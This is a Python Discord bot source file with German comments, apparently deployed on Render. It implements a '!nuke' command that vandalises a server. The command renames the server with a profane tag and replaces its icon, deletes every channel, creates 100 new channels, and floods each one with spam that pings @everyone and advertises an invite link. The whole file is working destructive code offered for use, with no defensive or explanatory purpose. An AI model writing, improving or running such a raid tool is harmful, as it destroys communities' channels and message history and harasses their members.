import os
from dotenv import load_dotenv
import discord
from discord.ext import commands
import asyncio
from keep_alive import keep_alive  # Flask-Webserver

# Lade .env-Datei (nur lokal relevant, auf Render wird Umgebungsvariable gesetzt)
load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN")

if not BOT_TOKEN:
    print("ERROR: BOT_TOKEN ist nicht gesetzt! Bitte .env anlegen oder Umgebungsvariable konfigurieren.")
    exit(1)

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.command(name="nuke")
@commands.has_permissions(administrator=True)
async def reset_channels(ctx):
    guild = ctx.guild

    # Servername und Icon ändern
    try:
        await guild.edit(name="FUCKED BY BBS!")  # <-- Dein neuer Servername
        with open("icon_nuke.jpeg", "rb") as icon_file:  # <-- Dein Bild (muss im gleichen Ordner liegen)
            await guild.edit(icon=icon_file.read())
        print("✅ Servername und Icon wurden geändert.")
    except Exception as e:
        print(f"❌ Fehler beim Ändern von Servername oder Icon: {e}")

    # 1. Alle Kanäle parallel löschen
    delete_tasks = [channel.delete() for channel in guild.channels]
    delete_results = await asyncio.gather(*delete_tasks, return_exceptions=True)

    for result in delete_results:
        if isinstance(result, Exception):
            print(f"❌ Fehler beim Löschen eines Kanals: {result}")

    # 2. Neue Kanäle parallel erstellen
    create_tasks = [guild.create_text_channel(name="made-by-bbs") for _ in range(100)]
    created_channels = await asyncio.gather(*create_tasks, return_exceptions=True)

    new_channels = [ch for ch in created_channels if isinstance(ch, discord.TextChannel)]

    # 3. Nachrichten parallel in allen neuen Kanälen senden
    async def send_messages(channel):
        for _ in range(20):
            try:
                await channel.send("Fucked by BBS WOMP WOMP! @everyone https://discord.gg/elnarco")
                await asyncio.sleep(0)
            except Exception as e:
                print(f"Fehler beim Senden in {channel.name}: {e}")
                continue

    send_tasks = [send_messages(ch) for ch in new_channels]
    await asyncio.gather(*send_tasks)

# Starte Flask-Webserver und dann den Bot
keep_alive()
bot.run(BOT_TOKEN)
